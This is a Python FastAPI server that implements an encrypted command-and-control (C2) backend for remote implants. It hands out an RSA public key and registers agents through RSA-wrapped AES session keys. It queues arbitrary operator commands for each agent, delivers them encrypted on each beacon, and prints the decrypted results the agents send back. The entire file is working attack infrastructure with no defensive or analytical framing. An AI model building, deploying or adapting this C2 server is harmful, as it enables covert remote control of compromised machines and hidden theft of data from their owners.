import uvicorn
import base64
import os
from fastapi import FastAPI, Request
from contextlib import asynccontextmanager
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes

from database import (
    init_db,
    register_agent,
    update_last_seen,
    get_all_agents
)

# -------------------------
# Generate RSA Keys
# -------------------------
key = RSA.generate(2048)
private_key = key
public_key = key.publickey()

rsa_decryptor = PKCS1_OAEP.new(private_key)

# Session keys per agent
sessions = {}

tasks = []

# -------------------------
# Startup
# -------------------------
@asynccontextmanager
async def lifespan(app: FastAPI):
    print("[*] Starting encrypted C2...")
    init_db()
    yield

app = FastAPI(lifespan=lifespan)


# -------------------------
# Provide public key
# -------------------------
@app.get("/pubkey")
def get_pubkey():
    return {
        "key": public_key.export_key().decode()
    }


# -------------------------
# Register agent
# -------------------------
@app.post("/register")
async def register(request: Request):
    data = await request.json()

    encrypted_key = base64.b64decode(data["key"])
    aes_key = rsa_decryptor.decrypt(encrypted_key)

    agent_info = data["info"]

    agent_id = register_agent(agent_info)
    sessions[agent_id] = aes_key

    print(f"[+] Encrypted session established: {agent_id}")

    return {"agent_id": agent_id}


# -------------------------
# Decrypt helper
# -------------------------
def decrypt_message(agent_id, payload):
    aes_key = sessions[agent_id]

    raw = base64.b64decode(payload)
    iv = raw[:16]
    ciphertext = raw[16:]

    cipher = AES.new(aes_key, AES.MODE_CFB, iv=iv)
    return cipher.decrypt(ciphertext).decode()


# -------------------------
# Encrypt helper
# -------------------------
def encrypt_message(agent_id, message):
    aes_key = sessions[agent_id]

    iv = get_random_bytes(16)
    cipher = AES.new(aes_key, AES.MODE_CFB, iv=iv)

    encrypted = iv + cipher.encrypt(message.encode())
    return base64.b64encode(encrypted).decode()


# -------------------------
# Beacon
# -------------------------
@app.post("/beacon/{agent_id}")
async def beacon(agent_id: str, request: Request):
    update_last_seen(agent_id)

    data = await request.json()

    decrypted = decrypt_message(agent_id, data["data"])

    # optional padding removal
    if "|" in decrypted:
        decrypted = decrypted.split("|")[0]

    for task in tasks:
        if task["agent_id"] == agent_id and task["status"] == "pending":
            task["status"] = "sent"

            encrypted_task = encrypt_message(agent_id, task["command"])
            return {"task": encrypted_task}

    return {"task": None}


# -------------------------
# Receive result
# -------------------------
@app.post("/result/{agent_id}")
async def receive_result(agent_id: str, request: Request):
    data = await request.json()

    decrypted = decrypt_message(agent_id, data["data"])

    print(f"[+] Result from {agent_id}")
    print(decrypted)

    return {"status": "ok"}


# -------------------------
# Create task
# -------------------------
@app.post("/task/{agent_id}")
def create_task(agent_id: str, data: dict):
    task = {
        "agent_id": agent_id,
        "command": data["command"],
        "status": "pending"
    }

    tasks.append(task)
    return {"message": "queued"}


@app.get("/agents")
def agents():
    return get_all_agents()


if __name__ == "__main__":
    uvicorn.run("main:app", host="127.0.0.1", port=8000, reload=True)